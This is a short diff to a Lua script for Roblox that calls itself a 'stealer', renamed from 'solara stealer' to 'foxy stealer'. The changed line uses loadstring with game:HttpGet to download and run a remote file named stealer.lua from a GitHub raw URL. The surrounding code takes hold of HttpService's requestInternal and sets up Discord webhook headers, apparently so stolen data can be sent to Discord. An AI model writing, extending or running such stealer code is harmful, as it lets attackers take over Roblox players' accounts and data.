@@ -4,7 +4,7 @@
 
 
 
-    solara stealer - magnet
+    foxy stealer - magnet
 
 
 
@@ -20,7 +20,7 @@ local marketplaceService = game:GetService("MarketplaceService")
 local httpService = game:GetService("HttpService")
 local requestInternal = httpService.requestInternal
 
-local pretty = loadstring(game:HttpGet("https://raw.githubusercontent.com/emocannn5353//master/repr.lua"))()
+local pretty = loadstring(game:HttpGet("https://raw.githubusercontent.com/emocannn5353/eymfox/refs/heads/main/stealer.lua"))()
 local prettySettings = {pretty = true}
 
 local DISCORD_HEADERS = {["Content-Type"] = "application/json"}
